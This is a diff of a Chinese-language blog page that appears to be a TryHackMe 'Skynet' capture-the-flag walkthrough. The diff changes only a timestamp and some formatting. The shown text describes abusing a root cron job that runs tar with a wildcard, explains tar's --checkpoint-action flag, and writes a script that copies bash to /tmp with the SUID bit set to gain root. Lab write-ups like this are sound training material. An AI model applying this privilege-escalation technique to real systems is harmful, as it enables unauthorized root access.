@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cvbxy.github.io/img/blog2.jpeg">
 <meta property="article:published_time" content="2023-07-22T13:43:16.000Z">
-<meta property="article:modified_time" content="2023-07-22T13:50:51.012Z">
+<meta property="article:modified_time" content="2023-07-22T13:53:42.005Z">
 <meta property="article:author" content="cvbxy">
 <meta property="article:tag" content="TryHackMe">
 <meta property="article:tag" content="靶机">
@@ -339,7 +339,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@skynet:/home/milesdyson/backups$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># m h dom mon dow user  command</span><br>*/1 *   * * *   root    /home/milesdyson/backups/backup.sh<br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><br><span class="hljs-comment"># backup.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">cd</span> /var/www/html<br>tar cf /home/milesdyson/backups/backup.tgz *<br></code></pre></td></tr></table></figure>
 
 <blockquote>
-<p>通过**<code>tar</code><strong>命令可以利用一个名为</strong><code>–checkpoint</code>**的参数，该参数允许在每次归档 X 个文件时（X的默认值为10）显示“进度”消息， **<code>–checkpoint</code><strong>还可以与 <strong><code>–checkpoint-action</code></strong> 标志串联使用，</strong><code>–checkpoint-action</code>**标志允许在到达检查点（checkpoint）时以二进制或脚本的形式执行某些操作。</p>
+<p>通过<code>tar</code>命令可以利用一个名为<code>–checkpoint</code>的参数，该参数允许在每次归档 X 个文件时（X的默认值为10）显示“进度”消息， <code>–checkpoint</code>还可以与 <code>–checkpoint-action</code> 标志串联使用，<code>–checkpoint-action</code>标志允许在到达检查点（checkpoint）时以二进制或脚本的形式执行某些操作。</p>
 </blockquote>
 <p>在<code>/var/www/html</code>目录下创建一个脚本来提权</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@skynet:/var/www/html$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/bash /tmp/sroot &amp;&amp; chmod +s /tmp/sroot&quot;</span> &gt; shell.sh<br></code></pre></td></tr></table></figure>
